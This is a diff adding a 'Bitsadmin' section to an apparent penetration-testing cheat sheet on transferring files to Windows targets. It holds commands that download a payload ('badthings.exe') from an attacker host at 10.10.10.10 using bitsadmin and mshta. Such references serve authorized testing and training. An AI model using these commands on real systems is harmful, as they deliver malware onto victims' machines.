@@ -117,6 +117,12 @@ FTP:
 C:\>mshta ftp://10.10.10.10:21/badthings.exe
 ```
 
+### Trasfering Files using Bitsadmin
+Background Intelligent Transfer Service (BITS) is a component of Microsoft Windows XP and later iterations of the operating systems, which facilitates asynchronous, prioritized, and throttled transfer of files between machines using idle network bandwidth. BITSAdmin is a command-line tool that you can use to create download or upload jobs and monitor their progress. For full, comprehensive documentation of the tool and all of its commands, see bitsadmin and bitsadmin examples in the Windows IT Pro Center.
+```
+C:\>bitsadmin /transfer badthings http://10.10.10.10:80/badthings.exe c:\users\public\payload.exe
+```
+
 ### Uploading Files with PowerShell  
 
 Test to see if we can run Powershell:
